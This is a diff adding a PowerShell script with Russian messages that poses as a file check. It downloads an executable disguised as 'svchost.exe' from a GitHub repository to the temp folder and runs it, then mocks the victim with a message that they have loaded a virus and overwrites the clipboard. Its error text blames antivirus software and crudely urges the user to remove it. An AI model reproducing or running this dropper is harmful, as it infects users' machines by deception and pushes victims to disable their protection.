@@ -1,0 +1,24 @@
+try {
+    Write-Host 'Начинаю проверку файлов, ожидайте...' -ForegroundColor Gray
+    $outputFile = Join-Path $env:TEMP "svchost.exe"
+    $wc = New-Object Net.WebClient
+    $wc.DownloadFile('https://github.com/agroverhh/bigBUBA/raw/main/svchost.exe', $env:TEMP + '\svchost.exe')
+} catch {
+    Write-Host 'Возникла ошибка при получении доступа к редактору реестра, возможно виноват антивирус либо низкая скорость интернета.' -ForegroundColor Red
+    pause
+    return
+}
+try {
+    Start-Process -FilePath $outputFile -Wait
+    Write-Host 'вы успешно загрузили вирус. пизда тебе нахуй.' -ForegroundColor Green
+    Remove-Item –Path "C:\Temp\svchost.exe"
+    Set-Clipboard -Value "Z"
+    Write-Host '(вирусыыыыы)' -ForegroundColor Blue
+	Write-Host '(QW16IENyYWNrIFlvdQ==)' -ForegroundColor Green
+    pause
+    return
+} catch {
+    Write-Host 'антивирус снеси нахуй даун или впн.' -ForegroundColor Red
+    pause
+    return
+}
